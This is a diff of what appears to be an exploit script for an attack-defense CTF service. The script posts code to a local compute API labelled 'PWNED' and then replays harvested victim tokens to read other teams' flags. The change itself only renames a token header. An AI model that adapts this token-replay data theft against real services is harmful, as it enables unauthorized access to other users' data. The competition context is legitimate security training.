@@ -52,13 +52,13 @@ fun main() {
 with requests.post('http://localhost:7654/api/compute', json={'description': 'PWNED', 'code': code}) as r:
     print(r, r.content)
     assert(r.status_code == 201)
-    token = r.headers['X-BCS-Token']
+    token = r.headers['X-DCS-Token']
 
-with requests.get('http://localhost:7654/api/compute', headers={'X-BCS-Token': token}) as r:
+with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': token}) as r:
     print(r, r.content)
     assert(r.status_code == 200)
 
-with requests.get('http://localhost:7654/api/compute', headers={'X-BCS-Token': 'ructfructfructfructfructfructfru'}) as r:
+with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': 'ructfructfructfructfructfructfru'}) as r:
     print(r, r.content)
     assert(r.status_code == 200)
 
@@ -74,7 +74,7 @@ for t in victim_tokens:
     if t == '':
         continue
 
-    with requests.get('http://localhost:7654/api/compute', headers={'X-BCS-Token': t}) as r:
+    with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': t}) as r:
         assert(r.status_code == 200)
 
         f = json.loads(r.content.decode('utf-8'))["description"]
